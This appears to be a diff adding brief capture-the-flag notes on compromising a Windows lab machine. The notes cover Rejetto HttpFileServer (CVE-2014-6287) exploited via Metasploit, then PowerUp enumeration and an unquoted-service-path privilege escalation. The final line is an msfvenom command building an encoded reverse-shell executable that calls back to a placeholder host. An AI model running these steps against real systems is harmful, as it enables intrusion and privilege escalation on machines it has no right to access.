@@ -1,0 +1,18 @@
+Notes:
+
+Started with nmap scan
+
+Found HttpFileServer on 8080 and found it was rejetto
+Found CVE 2014-6287 and searched it in metasploit
+
+Connected to machine
+
+Uploaded PowerUp.ps1 script to rhost and loaded powershell mod to meterpreter
+ load powershell
+ powershell_shell
+ . ./PowerUp.ps1
+
+Saw AdvancedSystemCareService9 had unquoted service path vuln and restart available.
+
+Made msfvenom reverse shell exe to replace AdvancedSystemCareService9
+ msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o AdvancedSystemCareService9.exe
